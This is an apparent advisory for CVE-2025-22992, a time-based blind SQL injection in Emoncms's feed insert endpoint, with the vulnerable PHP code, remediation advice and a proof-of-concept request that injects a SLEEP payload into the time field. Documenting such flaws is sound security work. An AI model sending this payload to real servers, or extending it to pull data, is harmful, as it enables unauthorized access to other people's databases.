# CVE-2025-22992 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-22992
- **CWE ID**: CWE-89 (SQL Injection)
- **CVSS Score**: 9.8 (Critical)
- **Affected Software**: Emoncms >= 11.6.9
- **Vulnerability Type**: Time-based Blind SQL Injection

## Description

A SQL Injection vulnerability exists in the `/feed/insert.json` endpoint of the Emoncms project. The vulnerability is caused by improper handling of user-supplied input in the `data` query parameter, allowing attackers to execute arbitrary SQL commands when using MySQL/MariaDB storage engine.

## Vulnerable Code

The vulnerability exists in `Modules/feed/engine/MysqlTimeSeries.php`:

```php
public function post($feedid, $time, $value, $padding_mode=null)
{
    $table = $this->get_table_name(intval($feedid));
    $this->mysqli->query("INSERT INTO $table (time,data) VALUES ('$time','$value') ON DUPLICATE KEY UPDATE data=VALUES(data)");
}
```

The `$time` and `$value` variables are directly concatenated into the SQL query without proper sanitization or parameterization.

## Exploitation

### Prerequisites

1. Valid API key with write permissions
2. A feed created with MySQL/MariaDB engine (engine=0)
3. Redis must be disabled (default in some configurations)

### Attack Vector

The `data` parameter in `/feed/insert.json` accepts JSON-formatted array of `[time, value]` pairs. By injecting SQL code into the time field, an attacker can execute arbitrary SQL commands.

### PoC Request

```http
POST /feed/insert.json?id=2&apikey=<WRITE_API_KEY> HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

data=[["1' and SLEEP(3) and '1'='1", 100]]
```

### Expected Result

The server response is delayed by 3 seconds, confirming the SQL injection vulnerability through time-based blind technique.

## Impact

- **Confidentiality**: Attackers can extract sensitive data from the database
- **Integrity**: Attackers can modify or delete data in the database
- **Availability**: Attackers can cause denial of service through resource-intensive queries

## Remediation

1. Use prepared statements with parameterized queries
2. Sanitize and validate all user input before database operations
3. Update to a patched version of Emoncms when available

## Timeline

- **Discovery**: 2025
- **CVE Published**: February 2025
- **Vendor Notification**: Unknown

## References

- https://github.com/emoncms/emoncms
- https://cvefeed.io/vuln/detail/CVE-2025-22992
